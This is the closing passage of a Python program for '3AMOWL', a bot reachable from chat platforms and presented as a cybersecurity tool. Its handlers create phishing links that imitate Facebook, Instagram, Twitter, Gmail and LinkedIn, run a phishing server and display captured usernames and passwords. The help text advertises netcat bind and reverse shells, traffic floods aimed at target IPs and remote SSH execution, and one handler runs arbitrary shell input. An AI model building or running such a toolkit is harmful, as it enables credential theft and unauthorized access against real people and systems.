            return {'success': True, 'output': f"📍 IP: {args[0]}\n  Country: {result.get('country')}\n  City: {result.get('city')}\n  ISP: {result.get('isp')}"}
        return {'success': False, 'output': "Location lookup failed"}
    
    # ==================== System Handlers ====================
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        output = f"💻 System Information:\n  CPU: {cpu}%\n  Memory: {mem.percent}% ({mem.used//1024//1024}MB/{mem.total//1024//1024}MB)\n  Disk: {disk.percent}% ({disk.used//1024//1024}MB/{disk.total//1024//1024}MB)\n  OS: {platform.system()} {platform.release()}\n  Hostname: {socket.gethostname()}"
        return {'success': True, 'output': output}
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        monitor_status = "✅ Running" if hasattr(self, 'monitor') and self.monitor.monitoring else "❌ Stopped"
        output = f"🦉 3AMOWL Status:\n  Session: {stats.get('active_sessions', 0)} active\n  Commands: {stats.get('total_commands', 0)}\n  Threats: {stats.get('total_threats', 0)}\n  Blocked IPs: {stats.get('total_blocked_ips', 0)}\n  Monitoring: {monitor_status}\n  Phishing Links: {stats.get('active_phishing_links', 0)}\n  Captured Credentials: {stats.get('captured_credentials', 0)}\n  Netcat Listeners: {stats.get('active_netcat_listeners', 0)}\n  Shodan Queries: {stats.get('total_shodan_queries', 0)}"
        return {'success': True, 'output': output, 'data': stats}
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': "✅ No recent threats detected"}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡"
            output += f"  {severity_color} [{t['timestamp'][:19]}] {t['threat_type']} from {t['source_ip']} - {t['severity'].upper()}\n"
        return {'success': True, 'output': output, 'data': {'threats': threats}}
    
    def _execute_report(self, args: List[str]) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        report = {
            'generated_at': datetime.datetime.now().isoformat(),
            'statistics': stats,
            'recent_threats': len(threats),
            'system_status': {
                'cpu': psutil.cpu_percent(),
                'memory': psutil.virtual_memory().percent,
                'disk': psutil.disk_usage('/').percent
            }
        }
        output = f"📊 Security Report\n  Generated: {report['generated_at'][:19]}\n  Total Commands: {stats['total_commands']}\n  Total Threats: {stats['total_threats']}\n  Blocked IPs: {stats['total_blocked_ips']}\n  Captured Credentials: {stats['captured_credentials']}\n  CPU: {report['system_status']['cpu']}%\n  Memory: {report['system_status']['memory']}%\n  Disk: {report['system_status']['disk']}%"
        return {'success': True, 'output': output, 'data': report}
    
    # ==================== Social Engineering Handlers ====================
    def _execute_phishing_facebook(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("facebook")
        return {'success': result['success'], 'output': f"Facebook phishing link created: ID {result.get('link_id')}"}
    
    def _execute_phishing_instagram(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("instagram")
        return {'success': result['success'], 'output': f"Instagram phishing link created: ID {result.get('link_id')}"}
    
    def _execute_phishing_twitter(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("twitter")
        return {'success': result['success'], 'output': f"Twitter phishing link created: ID {result.get('link_id')}"}
    
    def _execute_phishing_gmail(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("gmail")
        return {'success': result['success'], 'output': f"Gmail phishing link created: ID {result.get('link_id')}"}
    
    def _execute_phishing_linkedin(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("linkedin")
        return {'success': result['success'], 'output': f"LinkedIn phishing link created: ID {result.get('link_id')}"}
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: phishing_start_server <link_id> [port]"}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        success = self.social_tools.start_phishing_server(link_id, port)
        if success:
            url = self.social_tools.get_server_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}", 'data': {'url': url}}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        self.social_tools.stop_phishing_server()
        return {'success': True, 'output': "Phishing server stopped"}
    
    def _execute_phishing_status(self, args: List[str]) -> Dict[str, Any]:
        running = self.social_tools.phishing_server.running
        if running:
            url = self.social_tools.get_server_url()
            return {'success': True, 'output': f"🎣 Phishing server running on {url}"}
        return {'success': True, 'output': "Phishing server not running"}
    
    def _execute_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': "No captured credentials found"}
        output = "🎣 Captured Credentials:\n"
        for c in creds[:10]:
            output += f"  {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output, 'data': {'credentials': creds}}
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': "Command timed out"}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# MAIN APPLICATION
# =====================
class ThreeAMOWL:
    """Main application class - 3AMOWL Cybersecurity Bot"""
    
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.shodan = ShodanIntegration(self.db)
        self.netcat = NetcatTools(self.db, self.config)
        self.ssh_manager = SSHManager(self.db, self.config)
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen, self.shodan, self.netcat)
        self.monitor = NetworkMonitor(self.db, self.config)
        self.discord_bot = ThreeAMOWLDiscord(self.handler, self.db, self.monitor)
        self.telegram_bot = ThreeAMOWLTelegram(self.handler, self.db)
        self.whatsapp_bot = ThreeAMOWLWhatsApp(self.handler, self.db)
        self.slack_bot = ThreeAMOWLSlack(self.handler, self.db)
        self.signal_bot = ThreeAMOWLSignal(self.handler, self.db)
        self.imessage_bot = ThreeAMOWLiMessage(self.handler, self.db)
        self.session_id = self.db.create_session("local_user")
        self.running = True
        
        # Attach monitor to handler for status
        self.handler.monitor = self.monitor
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE}        🦉 3AMOWL v1.0.0    🦉                                       {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}  • 🕷️ Shodan Internet Device Search       • 📡 Netcat Shells & Listeners  {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔌 SSH Remote Command Execution        • ⏰ Time/Date Commands          {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🚀 REAL Traffic Generation             • ICMP/TCP/UDP/HTTP/DNS/ARP      {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🎣 Social Engineering Suite             • Facebook/Instagram/Twitter/Gmail {Colors.PRIMARY}║
║{Colors.ACCENT}  • 📱 LinkedIn Phishing                    • QR Code Generation             {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔗 URL Shortening                       • Credential Capture & Logging   {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🕷️ Nikto Web Scanner                      • IP Management & Blocking       {Colors.PRIMARY}║
║{Colors.ACCENT}  • 📱 Multi-Platform: Discord/Telegram/WhatsApp/Signal/Slack/iMessage {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE2}            🎯 3000+ ADVANCED CYBERSECURITY COMMANDS                    {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🔒 FEATURES:{Colors.RESET}
  • 🕷️ **Shodan Integration** - Search internet-connected devices
  • 📡 **Netcat Commands** - Bind shells, reverse shells, file transfer, port scanning
  • 🔌 **SSH Command Execution** - Execute commands on remote servers
  • 🚀 **REAL Traffic Generation** - ICMP, TCP, UDP, HTTP, DNS, ARP traffic
  • 🎣 **Social Engineering Suite** - Phishing pages with credential capture
  • 📱 **Multi-Platform Bots** - Discord, Telegram, WhatsApp, Signal, Slack, iMessage

{Colors.SECONDARY}💡 Type 'help' for command list{Colors.RESET}
{Colors.PURPLE}🕷️ Type 'shodan' for Shodan commands (needs API key){Colors.RESET}
{Colors.ORANGE}📡 Type 'nc_list' to see netcat listeners{Colors.RESET}
        """
        print(banner)
    
    def print_help(self):
        help_text = f"""
{Colors.PRIMARY}┌─────────────────{Colors.PURPLE} 3AMOWL COMMANDS {Colors.PRIMARY}─────────────────┐{Colors.RESET}

{Colors.PURPLE}🕷️ SHODAN COMMANDS:{Colors.RESET}
  shodan <query>          - Search Shodan for devices
  shodan_host <ip>        - Get host information
  shodan_count <query>    - Get result count

{Colors.ORANGE}📡 NETCAT COMMANDS:{Colors.RESET}
  nc_listen <port> [mode] - Create netcat listener
  nc_connect <host> <port> - Connect to listener
  nc_scan <target> <ports> - Port scan using netcat
  nc_shell <bind|reverse> <port> [lhost] - Create shell
  nc_list                  - List active listeners
  nc_stop [id]             - Stop listener(s)

{Colors.PRIMARY}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list                                       - List SSH servers
  ssh_connect <server_id>                        - Connect to server
  ssh_exec <server_id> <command>                  - Execute command
  ssh_disconnect [server_id]                      - Disconnect

{Colors.PRIMARY}⏰ TIME & DATE COMMANDS:{Colors.RESET}
  time                     - Show current time
  date                     - Show current date
  datetime                 - Show both date and time
  history [limit]          - View command history
  time_history             - View time command history

{Colors.PRIMARY}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] - Generate real traffic
  traffic_types            - List available types
  traffic_stop [id]        - Stop generation

{Colors.PRIMARY}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target>           - Basic web vulnerability scan
  nikto_full <target>      - Full scan with all tests

{Colors.PRIMARY}🎣 SOCIAL ENGINEERING:{Colors.RESET}
  generate_phishing_link_for_facebook     - Facebook phishing
  generate_phishing_link_for_instagram    - Instagram phishing
  generate_phishing_link_for_twitter      - Twitter phishing
  generate_phishing_link_for_gmail        - Gmail phishing
  generate_phishing_link_for_linkedin     - LinkedIn phishing
  phishing_start_server <id> [port]       - Start phishing server
  phishing_stop_server                    - Stop server
  phishing_status                         - Check status
  phishing_credentials [id]                - View captured data

{Colors.PRIMARY}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes]      - Add IP to monitoring
  remove_ip <ip>           - Remove IP
  block_ip <ip> [reason]   - Block IP
  unblock_ip <ip>         - Unblock IP
  list_ips                 - List managed IPs
  ip_info <ip>            - Detailed IP info

{Colors.PRIMARY}🛡️ NETWORK COMMANDS:{Colors.RESET}
  ping <ip>                - Ping an IP
  scan <ip>                - Scan ports 1-1000
  quick_scan <ip>          - Quick port scan
  nmap <ip> [type]         - Nmap scan
  full_scan <ip>           - Full port scan
  traceroute <target>      - Network path tracing

{Colors.PRIMARY}🔍 INFORMATION GATHERING:{Colors.RESET}
  whois <domain>           - WHOIS lookup
  dns <domain>             - DNS lookup
  location <ip>            - IP geolocation

{Colors.PRIMARY}📊 SYSTEM COMMANDS:{Colors.RESET}
  system                   - System info
  status                   - Bot status
  threats [limit]          - Recent threats
  report                   - Security report

{Colors.ORANGE}💡 EXAMPLES:{Colors.RESET}
  time
  date
  shodan apache city:"New York"
  nc_listen 4444 listen
  nc_shell bind 4444 /bin/bash
  ssh_add myserver 192.168.1.100 root password123
  ssh_exec myserver "ls -la"
  generate_traffic icmp 192.168.1.1 10
  nikto example.com
  generate_phishing_link_for_facebook
  phishing_start_server abc12345 8080
  add_ip 192.168.1.100 Suspicious
  block_ip 10.0.0.5 Port scanning

⚠️ **FOR AUTHORIZED SECURITY TESTING ONLY**
        """
        print(help_text)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        required_tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh', 'nc']
        for tool in required_tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️  {tool} not found{Colors.RESET}")
        
        if SHODAN_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ shodan library{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  shodan not found{Colors.RESET}")
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ scapy library{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  scapy not found{Colors.RESET}")
        
        if PARAMIKO_AVAILABLE:
            print(f"{Colors.SUCCESS}✅ paramiko library{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  paramiko not found{Colors.RESET}")
        
        if self.nikto.nikto_available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️  nikto not found{Colors.RESET}")
        
        print(f"\n{Colors.SUCCESS}✅ Dependencies check complete{Colors.RESET}")
    
    def setup_shodan(self):
        print(f"\n{Colors.PURPLE}🕷️ Shodan Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}")
        
        current = self.shodan.api_key
        if current:
            print(f"Status: {'✅ Enabled' if self.shodan.enabled else '❌ Disabled'}")
        else:
            print("Shodan not configured")
        
        print(f"\n{Colors.WARNING}Get your API key from: https://account.shodan.io/{Colors.RESET}")
        api_key = input(f"{Colors.ORANGE}Enter Shodan API key (or press Enter to skip): {Colors.RESET}").strip()
        if not api_key:
            print(f"{Colors.WARNING}⚠️  Shodan setup skipped{Colors.RESET}")
            return
        
        if self.shodan.set_api_key(api_key, True):
            print(f"{Colors.SUCCESS}✅ Shodan configured! Try: shodan apache{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}❌ Failed to save Shodan configuration{Colors.RESET}")
    
    def setup_discord(self):
        print(f"\n{Colors.PRIMARY}🤖 Discord Bot Setup{Colors.RESET}")
        token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
        if not token:
            return
        if self.discord_bot.save_config(token):
            print(f"{Colors.SUCCESS}✅ Discord configured!{Colors.RESET}")
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Discord bot started!{Colors.RESET}")
    
    def setup_telegram(self):
        print(f"\n{Colors.PRIMARY}📱 Telegram Bot Setup{Colors.RESET}")
        token = input(f"{Colors.ORANGE}Enter Telegram bot token: {Colors.RESET}").strip()
        if not token:
            return
        if self.telegram_bot.save_config(token):
            print(f"{Colors.SUCCESS}✅ Telegram configured!{Colors.RESET}")
            if self.telegram_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Telegram bot started!{Colors.RESET}")
    
    def setup_whatsapp(self):
        print(f"\n{Colors.PRIMARY}📱 WhatsApp Bot Setup{Colors.RESET}")
        phone = input(f"{Colors.ORANGE}Enter WhatsApp phone number: {Colors.RESET}").strip()
        if not phone:
            return
        if self.whatsapp_bot.save_config(phone):
            print(f"{Colors.SUCCESS}✅ WhatsApp configured!{Colors.RESET}")
    
    def setup_slack(self):
        print(f"\n{Colors.PRIMARY}💬 Slack Bot Setup{Colors.RESET}")
        token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
        if not token:
            return
        if self.slack_bot.save_config(token):
            print(f"{Colors.SUCCESS}✅ Slack configured!{Colors.RESET}")
            if self.slack_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}✅ Slack bot started!{Colors.RESET}")
    
    def setup_signal(self):
        print(f"\n{Colors.PRIMARY}🔐 Signal Bot Setup{Colors.RESET}")
        if not SIGNAL_CLI_AVAILABLE:
            print(f"{Colors.ERROR}❌ signal-cli not found{Colors.RESET}")
            return
        phone = input(f"{Colors.ORANGE}Enter Signal phone number: {Colors.RESET}").strip()
        if not phone:
            return
        if self.signal_bot.save_config(phone):
            print(f"{Colors.SUCCESS}✅ Signal configured!{Colors.RESET}")
    
    def setup_imessage(self):
        print(f"\n{Colors.PRIMARY}💬 iMessage Bot Setup{Colors.RESET}")
        if not IMESSAGE_AVAILABLE:
            print(f"{Colors.ERROR}❌ iMessage only available on macOS{Colors.RESET}")
            return
        if self.imessage_bot.save_config():
            print(f"{Colors.SUCCESS}✅ iMessage configured!{Colors.RESET}")
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd == 'help':
            self.print_help()
        elif cmd == 'start':
            self.monitor.start_monitoring()
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        elif cmd == 'stop':
            self.monitor.stop_monitoring()
            print(f"{Colors.WARNING}🛑 Threat monitoring stopped{Colors.RESET}")
        elif cmd == 'status':
            status = self.monitor.get_status()
            stats = self.db.get_statistics()
            ssh_status = self.ssh_manager.get_servers() if self.ssh_manager else []
            netcat_listeners = self.netcat.get_listeners() if self.netcat else []
            
            print(f"\n{Colors.PRIMARY}📊 System Status:{Colors.RESET}")
            print(f"  Session ID: {self.session_id}")
            print(f"  Active Sessions: {stats.get('active_sessions', 0)}")
            print(f"  Total Commands: {stats.get('total_commands', 0)}")
            print(f"  Time Commands: {stats.get('total_time_commands', 0)}")
            
            print(f"\n{Colors.PURPLE}🕷️ Shodan Status:{Colors.RESET}")
            print(f"  Enabled: {'✅ Yes' if self.shodan.enabled else '❌ No'}")
            print(f"  API Key: {'✅ Configured' if self.shodan.api_key else '❌ Not configured'}")
            
            print(f"\n{Colors.ORANGE}📡 Netcat Status:{Colors.RESET}")
            print(f"  Active Listeners: {len(netcat_listeners)}")
            
            print(f"\n{Colors.PRIMARY}🔌 SSH Status:{Colors.RESET}")
            print(f"  Configured Servers: {len(ssh_status)}")
            print(f"  Total SSH Commands: {stats.get('total_ssh_commands', 0)}")
            
            print(f"\n{Colors.PRIMARY}📊 Monitoring Status:{Colors.RESET}")
            print(f"  Active: {'✅ Yes' if status['monitoring'] else '❌ No'}")
            print(f"  Monitored IPs: {status['monitored_ips_count']}")
            print(f"  Blocked IPs: {status.get('blocked_ips', 0)}")
            print(f"  Auto-block: {'✅ Enabled' if status.get('auto_block') else '❌ Disabled'}")
            
            print(f"\n{Colors.PRIMARY}🤖 Bot Status:{Colors.RESET}")
            print(f"  Discord: {'✅ Active' if self.discord_bot.running else '❌ Inactive'}")
            print(f"  Telegram: {'✅ Active' if self.telegram_bot.running else '❌ Inactive'}")
            print(f"  WhatsApp: {'✅ Active' if self.whatsapp_bot.running else '❌ Inactive'}")
            print(f"  Signal: {'✅ Active' if self.signal_bot.running else '❌ Inactive'}")
            print(f"  Slack: {'✅ Active' if self.slack_bot.running else '❌ Inactive'}")
            print(f"  iMessage: {'✅ Active' if self.imessage_bot.running else '❌ Inactive'}")
            
            traffic_active = len(self.traffic_gen.get_active_generators()) if self.traffic_gen else 0
            print(f"\n{Colors.PRIMARY}🚀 Traffic Generation:{Colors.RESET}")
            print(f"  Active Generators: {traffic_active}")
            print(f"  Total Tests: {stats.get('total_traffic_tests', 0)}")
            
            if self.handler.social_tools.phishing_server.running:
                print(f"\n{Colors.PRIMARY}🎣 Phishing Server:{Colors.RESET}")
                print(f"  Status: ✅ Running")
                print(f"  URL: {self.handler.social_tools.get_server_url()}")
            
            threats = self.db.get_recent_threats(3)
            if threats:
                print(f"\n{Colors.ERROR}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.ERROR if threat['severity'] in ['critical', 'high'] else Colors.WARNING
                    print(f"  {severity_color}{threat['threat_type']} from {threat['source_ip']}{Colors.RESET}")
        
        elif cmd == 'threats':
            threats = self.db.get_recent_threats(10)
            if threats:
                print(f"\n{Colors.ERROR}🚨 Recent Threats:{Colors.RESET}")
                for threat in threats:
                    severity_color = Colors.ERROR if threat['severity'] in ['critical', 'high'] else Colors.WARNING
                    print(f"\n{severity_color}[{threat['timestamp'][:19]}] {threat['threat_type']}{Colors.RESET}")
                    print(f"  Source: {threat['source_ip']}")
                    print(f"  Severity: {threat['severity'].upper()}")
                    print(f"  Description: {threat['description']}")
            else:
                print(f"{Colors.SUCCESS}✅ No recent threats detected{Colors.RESET}")
        
        elif cmd == 'history':
            history = self.db.get_command_history(20)
            if history:
                print(f"\n{Colors.PRIMARY}📜 Command History:{Colors.RESET}")
                for record in history:
                    status = f"{Colors.SUCCESS}✅" if record['success'] else f"{Colors.ERROR}❌"
                    print(f"{status} [{record['source']}] {record['command'][:50]}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}📜 No command history{Colors.RESET}")
        
        elif cmd == 'time_history':
            history = self.db.get_time_history(10)
            if history:
                print(f"\n{Colors.PRIMARY}⏰ Time Command History:{Colors.RESET}")
                for record in history:
                    print(f"  [{record['timestamp'][:19]}] {record['command']}")
            else:
                print(f"{Colors.WARNING}⏰ No time command history{Colors.RESET}")
        
        elif cmd == 'report':
            result = self.handler.execute("report")
            if result['success']:
                print(f"\n{Colors.PRIMARY}📊 Security Report{Colors.RESET}")
                print(result['output'])
            else:
                print(f"{Colors.ERROR}❌ Failed to generate report{Colors.RESET}")
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Thank you for using 3AMOWL!{Colors.RESET}")
        
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.check_dependencies()
        
        print(f"\n{Colors.PURPLE}🕷️ Shodan Setup{Colors.RESET}")
        setup_shodan = input(f"{Colors.ORANGE}Configure Shodan? (y/n): {Colors.RESET}").strip().lower()
        if setup_shodan == 'y':
            self.setup_shodan()
        
        print(f"\n{Colors.PRIMARY}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        print(f"  1. Discord\n  2. Telegram\n  3. WhatsApp\n  4. Slack\n  5. Signal\n  6. iMessage")
        choice = input(f"{Colors.ORANGE}Select bots to configure (comma-separated, e.g., 1,2): {Colors.RESET}").strip()
        
        if '1' in choice:
            self.setup_discord()
        if '2' in choice:
            self.setup_telegram()
        if '3' in choice:
            self.setup_whatsapp()
        if '4' in choice:
            self.setup_slack()
        if '5' in choice:
            self.setup_signal()
        if '6' in choice:
            self.setup_imessage()
        
        auto_monitor = input(f"\n{Colors.ORANGE}Start threat monitoring automatically? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.monitor.start_monitoring()
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        
        enable_auto_block = input(f"{Colors.ORANGE}Enable auto-blocking? (y/n): {Colors.RESET}").strip().lower()
        if enable_auto_block == 'y':
            self.monitor.auto_block = True
            print(f"{Colors.SUCCESS}✅ Auto-block enabled{Colors.RESET}")
        
        print(f"\n{Colors.SUCCESS}✅ 3AMOWL ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.PURPLE}🕷️ Try 'shodan' or 'shodan_host 8.8.8.8'{Colors.RESET}")
        print(f"{Colors.ORANGE}📡 Try 'nc_listen 4444' or 'nc_list'{Colors.RESET}")
        print(f"{Colors.PRIMARY}⏰ Try 'time', 'date', 'status'{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE}[{Colors.ORANGE}{self.session_id}{Colors.PURPLE}]{Colors.ORANGE} 🦉> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.monitor.stop_monitoring()
        self.ssh_manager.disconnect()
        self.traffic_gen.stop_generation()
        self.netcat.stop_listener()
        self.handler.social_tools.stop_phishing_server()
        self.db.end_session(self.session_id)
        self.db.close()
        
        print(f"\n{Colors.SUCCESS}✅ 3AMOWL shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PURPLE}🦉 Starting 3AMOWL...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        required_packages = ['requests', 'psutil']
        missing = []
        for pkg in required_packages:
            try:
                __import__(pkg)
            except ImportError:
                missing.append(pkg)
        
        if missing:
            print(f"{Colors.WARNING}⚠️  Missing: {', '.join(missing)}{Colors.RESET}")
            print(f"{Colors.WARNING}   Install: pip install {' '.join(missing)}{Colors.RESET}")
        
        # Check for admin/root
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.WARNING}⚠️  Run with sudo for full functionality (firewall, raw packets){Colors.RESET}")
        
        app = ThreeAMOWL()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()